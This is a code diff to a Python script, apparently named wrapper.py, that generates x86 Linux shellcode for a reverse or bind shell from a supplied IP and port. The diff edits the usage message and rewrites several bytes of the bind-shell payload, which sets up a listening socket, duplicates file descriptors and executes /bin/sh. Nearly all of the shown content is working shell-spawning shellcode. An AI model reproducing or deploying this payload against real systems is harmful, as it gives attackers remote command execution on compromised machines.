@@ -9,7 +9,7 @@ import binascii
 import socket
 
 if len(sys.argv) < 4:
-	print ('Usage: wrapper.py <ip> <port> <payload (1=rev 2=bind)>') #let user know that script requires an arg
+	print ("Usage: wrapper.py <ip(for BIND do 1.1.1.1> <port> <payload (1=rev 2=bind)>") #let user know that script requires an arg
 	exit()
 
 ip = (sys.argv[1])
@@ -66,14 +66,15 @@ if payload == int("2"):
 	print("Building BIND Shellcode")
 	shellcode = ""
 	shellcode += "\\x31\\xc0\\x50\\x6a\\x01\\x6a\\x02\\x31\\xc9\\x89\\xe1\\xb0"
-	shellcode += "\\x66\\xb3\\x01\\xcd\\x80\\x89\\xc6\\x31\\xdb\\x53\\x66\\x68"
+	shellcode += "\\x66\\x31\\xdb\\xb3\\x01\\xcd\\x80\\x89\\xc6\\x31\\xdb\\x53"
+	shellcode += "\\x66\\x68"
 	shellcode += port
 	shellcode += "\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\xb3"
 	shellcode += "\\x02\\xb0\\x66\\xcd\\x80\\x6a\\x01\\x56\\x89\\xe1\\xb3\\x04"
 	shellcode += "\\xb0\\x66\\xcd\\x80\\x50\\x50\\x56\\x89\\xe1\\xb3\\x05\\xb0"
 	shellcode += "\\x66\\xcd\\x80\\x89\\xc3\\x31\\xc9\\xb0\\x3f\\xcd\\x80\\x41"
-	shellcode += "\\x80\\xf9\\x04\\x75\\xf6\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73"
-	shellcode += "\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53"
+	shellcode += "\\x80\\xf9\\x04\\x75\\xf6\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73"
+	shellcode += "\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89\\xe2\\x53"
 	shellcode += "\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
 	print(shellcode)
 
